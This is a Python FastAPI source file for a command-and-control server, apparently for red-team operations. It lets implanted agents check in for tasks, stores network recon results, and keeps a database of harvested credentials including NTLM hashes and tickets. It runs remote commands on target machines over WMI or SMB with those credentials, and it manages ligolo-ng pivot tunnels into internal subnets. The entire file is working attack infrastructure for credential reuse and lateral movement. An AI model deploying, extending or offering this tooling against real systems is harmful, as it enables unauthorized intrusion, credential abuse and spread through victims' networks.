from fastapi import FastAPI, HTTPException
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from typing import Optional
import json
import os
from database import init_db, migrate_db, ensure_server_agent, get_conn
from impacket_wrapper import wmi_exec, smb_exec
from pivot_manager import start_proxy, stop_proxy, proxy_status, add_route, del_route

app = FastAPI()

FILES_DIR = os.path.join(os.path.dirname(__file__), "files")
os.makedirs(FILES_DIR, exist_ok=True)
app.mount("/files", StaticFiles(directory=FILES_DIR), name="files")


@app.on_event("startup")
def startup():
    init_db()
    migrate_db()
    ensure_server_agent()


# ── Models ────────────────────────────────────────────────────────────────────

class AgentCheckin(BaseModel):
    agent_id: str
    hostname: str
    username: str

class TaskResult(BaseModel):
    task_id: int
    agent_id: str
    output: str

class NewTask(BaseModel):
    agent_id: str
    instruction: str

class NewRecon(BaseModel):
    agent_id: str
    target: str     # single IP or CIDR (e.g. "10.0.2.5" or "10.0.2.0/24")

class NewCredential(BaseModel):
    agent_id: str
    username: str
    secret: str
    cred_type: str          # e.g. "plaintext", "ntlm", "ticket"
    source_host: str

class ExecRequest(BaseModel):
    target_ip: str
    domain: str = "WORKGROUP"
    command: str
    method: str = "wmi"             # "wmi" or "smb"
    cred_id: Optional[int] = None   # pull creds from loot DB …
    username: Optional[str] = None  # … or supply inline
    secret: Optional[str] = None
    cred_type: str = "plaintext"    # "plaintext" or "ntlm"

class ProxyStartRequest(BaseModel):
    interface:   str = "ligolo"
    listen_port: int = 11601
    proxy_bin:   str = "ligolo-ng-proxy"   # path or name of the binary

class TunnelRegister(BaseModel):
    agent_id:  str
    subnet:    str        # CIDR, e.g. "10.0.2.0/24"
    interface: str = "ligolo"


# ── Agent endpoints ───────────────────────────────────────────────────────────

@app.post("/checkin")
def checkin(data: AgentCheckin):
    with get_conn() as conn:
        # Upsert agent
        conn.execute("""
            INSERT INTO agents (agent_id, hostname, username)
            VALUES (?, ?, ?)
            ON CONFLICT(agent_id) DO UPDATE SET
                last_seen = datetime('now'),
                hostname  = excluded.hostname,
                username  = excluded.username
        """, (data.agent_id, data.hostname, data.username))

        # Grab oldest pending task for this agent
        row = conn.execute("""
            SELECT task_id, task_type, instruction FROM tasks
            WHERE agent_id = ? AND status = 'pending'
            ORDER BY task_id ASC
            LIMIT 1
        """, (data.agent_id,)).fetchone()

        if row:
            conn.execute(
                "UPDATE tasks SET status = 'sent' WHERE task_id = ?",
                (row["task_id"],)
            )
            print(f"[*] Check-in: {data.username}@{data.hostname} → task {row['task_id']} [{row['task_type']}]: {row['instruction']}")
            return {"task_id": row["task_id"], "task_type": row["task_type"], "instruction": row["instruction"]}

    print(f"[*] Check-in: {data.username}@{data.hostname} — no tasks queued")
    return {"task_id": None, "task_type": None, "instruction": None}


@app.post("/result")
def receive_result(data: TaskResult):
    with get_conn() as conn:
        task = conn.execute(
            "SELECT task_id, task_type FROM tasks WHERE task_id = ? AND agent_id = ?",
            (data.task_id, data.agent_id)
        ).fetchone()
        if not task:
            raise HTTPException(status_code=404, detail="Task not found")

        conn.execute(
            "UPDATE tasks SET status = 'completed' WHERE task_id = ?",
            (data.task_id,)
        )
        conn.execute(
            "INSERT INTO results (task_id, agent_id, output) VALUES (?, ?, ?)",
            (data.task_id, data.agent_id, data.output)
        )

        if task["task_type"] == "recon":
            _store_recon_hosts(conn, data.agent_id, data.output)

    print(f"[+] Result for task {data.task_id} [{task['task_type']}] from {data.agent_id}:\n{data.output}")
    return {"status": "ok"}


def _store_recon_hosts(conn, agent_id: str, output: str):
    try:
        data = json.loads(output)
        for host in data.get("hosts", []):
            port_list = host.get("ports", [])
            open_ports = ",".join(str(p["port"]) for p in port_list)
            services   = json.dumps(port_list)
            hostname   = host.get("hostname", "")
            conn.execute("""
                INSERT INTO hosts (ip, hostname, open_ports, services, discovered_by)
                VALUES (?, ?, ?, ?, ?)
                ON CONFLICT(ip) DO UPDATE SET
                    hostname      = excluded.hostname,
                    open_ports    = excluded.open_ports,
                    services      = excluded.services,
                    discovered_by = excluded.discovered_by,
                    discovered_at = datetime('now')
            """, (host["ip"], hostname, open_ports, services, agent_id))
        print(f"[+] Recon stored {len(data.get('hosts', []))} hosts")
    except Exception as e:
        print(f"[-] Failed to parse recon result: {e}")


# ── Operator endpoints ────────────────────────────────────────────────────────

@app.get("/agents")
def list_agents():
    with get_conn() as conn:
        rows = conn.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
    return [dict(r) for r in rows]


@app.post("/task")
def queue_task(data: NewTask):
    with get_conn() as conn:
        agent = conn.execute(
            "SELECT agent_id FROM agents WHERE agent_id = ?", (data.agent_id,)
        ).fetchone()
        if not agent:
            raise HTTPException(status_code=404, detail="Agent not found")

        cur = conn.execute(
            "INSERT INTO tasks (agent_id, instruction) VALUES (?, ?)",
            (data.agent_id, data.instruction)
        )
    print(f"[*] Task queued for {data.agent_id}: {data.instruction}")
    return {"task_id": cur.lastrowid, "status": "queued"}


@app.get("/results/{agent_id}")
def get_results(agent_id: str):
    with get_conn() as conn:
        rows = conn.execute("""
            SELECT r.result_id, r.task_id, t.instruction, r.output, r.received_at
            FROM results r
            JOIN tasks t ON r.task_id = t.task_id
            WHERE r.agent_id = ?
            ORDER BY r.received_at DESC
        """, (agent_id,)).fetchall()
    return [dict(r) for r in rows]


@app.post("/recon")
def queue_recon(data: NewRecon):
    with get_conn() as conn:
        agent = conn.execute(
            "SELECT agent_id FROM agents WHERE agent_id = ?", (data.agent_id,)
        ).fetchone()
        if not agent:
            raise HTTPException(status_code=404, detail="Agent not found")

        cur = conn.execute(
            "INSERT INTO tasks (agent_id, task_type, instruction) VALUES (?, 'recon', ?)",
            (data.agent_id, data.target)
        )
    print(f"[*] Recon task queued for {data.agent_id}: {data.target}")
    return {"task_id": cur.lastrowid, "status": "queued"}


@app.get("/hosts")
def list_hosts():
    with get_conn() as conn:
        rows = conn.execute("SELECT * FROM hosts ORDER BY discovered_at DESC").fetchall()
    return [dict(r) for r in rows]


@app.post("/credentials")
def store_credential(data: NewCredential):
    with get_conn() as conn:
        conn.execute("""
            INSERT INTO credentials (agent_id, username, secret, cred_type, source_host)
            VALUES (?, ?, ?, ?, ?)
        """, (data.agent_id, data.username, data.secret, data.cred_type, data.source_host))
    print(f"[+] Credential stored: {data.username} ({data.cred_type}) from {data.source_host}")
    return {"status": "ok"}


@app.get("/credentials")
def list_credentials():
    with get_conn() as conn:
        rows = conn.execute("SELECT * FROM credentials ORDER BY harvested_at DESC").fetchall()
    return [dict(r) for r in rows]


@app.post("/exec")
def remote_exec(data: ExecRequest):
    # ── Resolve credentials ───────────────────────────────────────────────────
    if data.cred_id is not None:
        with get_conn() as conn:
            cred = conn.execute(
                "SELECT username, secret, cred_type FROM credentials WHERE cred_id = ?",
                (data.cred_id,)
            ).fetchone()
        if not cred:
            raise HTTPException(status_code=404, detail="Credential not found")
        username  = cred["username"]
        secret    = cred["secret"]
        cred_type = cred["cred_type"]
    elif data.username and data.secret:
        username  = data.username
        secret    = data.secret
        cred_type = data.cred_type
    else:
        raise HTTPException(status_code=400, detail="Provide cred_id or username+secret")

    # ── Execute ───────────────────────────────────────────────────────────────
    EXEC_METHODS = {"wmi": wmi_exec, "smb": smb_exec}
    if data.method not in EXEC_METHODS:
        raise HTTPException(status_code=400, detail="method must be 'wmi' or 'smb'")

    output = EXEC_METHODS[data.method](
        data.target_ip, data.domain, username, secret, data.command, cred_type
    )

    # ── Store result ──────────────────────────────────────────────────────────
    with get_conn() as conn:
        cur = conn.execute(
            "INSERT INTO tasks (agent_id, task_type, instruction, status) VALUES ('server', 'exec', ?, 'completed')",
            (f"{data.method}://{data.target_ip} -> {data.command}",)
        )
        task_id = cur.lastrowid
        conn.execute(
            "INSERT INTO results (task_id, agent_id, output) VALUES (?, 'server', ?)",
            (task_id, output)
        )

    print(f"[+] Exec [{data.method}] on {data.target_ip}: {data.command}\n{output}")
    return {"task_id": task_id, "target": data.target_ip, "method": data.method, "output": output}


# ── Pivot endpoints ───────────────────────────────────────────────────────────

@app.post("/pivot/proxy/start")
def pivot_proxy_start(data: ProxyStartRequest):
    result = start_proxy(data.interface, data.listen_port, data.proxy_bin)
    print(f"[*] Pivot proxy: {result}")
    return result


@app.post("/pivot/proxy/stop")
def pivot_proxy_stop(data: ProxyStartRequest):
    result = stop_proxy(data.interface)
    print(f"[*] Pivot proxy stopped")
    return result


@app.get("/pivot/proxy/status")
def pivot_proxy_status():
    return proxy_status()


@app.post("/pivot/tunnel")
def register_tunnel(data: TunnelRegister):
    """
    Register a ligolo-ng tunnel after the operator has connected the session
    in the ligolo-ng console (session → start). Automatically adds the kernel
    route so all tools on the operator machine can reach the target subnet.
    """
    with get_conn() as conn:
        agent = conn.execute(
            "SELECT agent_id FROM agents WHERE agent_id = ?", (data.agent_id,)
        ).fetchone()
        if not agent:
            raise HTTPException(status_code=404, detail="Agent not found")

    route = add_route(data.subnet, data.interface)
    if not route["ok"]:
        raise HTTPException(status_code=500, detail=f"Failed to add route: {route['error']}")

    with get_conn() as conn:
        cur = conn.execute(
            "INSERT INTO tunnels (agent_id, interface, subnet) VALUES (?, ?, ?)",
            (data.agent_id, data.interface, data.subnet)
        )
        tunnel_id = cur.lastrowid

    print(f"[+] Tunnel registered: {data.subnet} via {data.interface} (agent: {data.agent_id})")
    return {"tunnel_id": tunnel_id, "agent_id": data.agent_id,
            "subnet": data.subnet, "interface": data.interface, "status": "active"}


@app.delete("/pivot/tunnel/{tunnel_id}")
def remove_tunnel(tunnel_id: int):
    """
    Mark a tunnel as down and remove the kernel route.
    Call this when the ligolo-ng agent disconnects or the pivot is no longer needed.
    """
    with get_conn() as conn:
        tunnel = conn.execute(
            "SELECT * FROM tunnels WHERE tunnel_id = ?", (tunnel_id,)
        ).fetchone()
        if not tunnel:
            raise HTTPException(status_code=404, detail="Tunnel not found")

        del_route(tunnel["subnet"], tunnel["interface"])

        conn.execute(
            "UPDATE tunnels SET status = 'down' WHERE tunnel_id = ?", (tunnel_id,)
        )

    print(f"[*] Tunnel {tunnel_id} torn down ({tunnel['subnet']} via {tunnel['interface']})")
    return {"tunnel_id": tunnel_id, "status": "down"}


@app.get("/pivot/tunnels")
def list_tunnels():
    with get_conn() as conn:
        rows = conn.execute(
            "SELECT * FROM tunnels ORDER BY created_at DESC"
        ).fetchall()
    return [dict(r) for r in rows]


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8080)
